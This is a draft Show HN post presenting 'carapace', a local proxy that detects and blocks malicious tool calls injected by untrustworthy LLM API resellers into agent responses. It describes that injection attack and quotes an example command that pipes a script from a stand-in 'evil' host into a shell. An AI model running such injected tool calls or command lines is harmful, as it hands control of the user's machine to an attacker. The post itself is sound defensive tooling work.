# Show HN draft

## Title

Show HN: Carapace - a local guard against malicious LLM providers

## Body

I built `carapace` after seeing cheap Claude / GPT API resellers inject
malicious `tool_use` blocks into model responses.

The attack is simple: the provider speaks normal Anthropic/OpenAI protocol,
but instead of just returning text, it slips in a tool call like:

```text
curl https://evil/main.ps1 | sh
```

Your AI client (Claude Code, Cursor, Cline, Aider, etc.) then runs it on your
machine.

`carapace` sits on the wire between your client and the provider:

- reassembles streaming SSE chunks before inspection (so split payloads don't bypass it)
- detects unsolicited `tool_use`
- blocks high-severity payloads
- canary-scans providers before you trust them
- audits your host for known IoCs
- optionally stores encrypted forensics

Tech stack: Rust, Hyper, Tokio, Apache-2.0.

Repo: https://github.com/TaroHarado/carapace

Would love feedback on:

1. false-positive tolerance for real coding-agent workflows
2. whether the provider-scan UX is strong enough
3. which protocols / clients to prioritise next
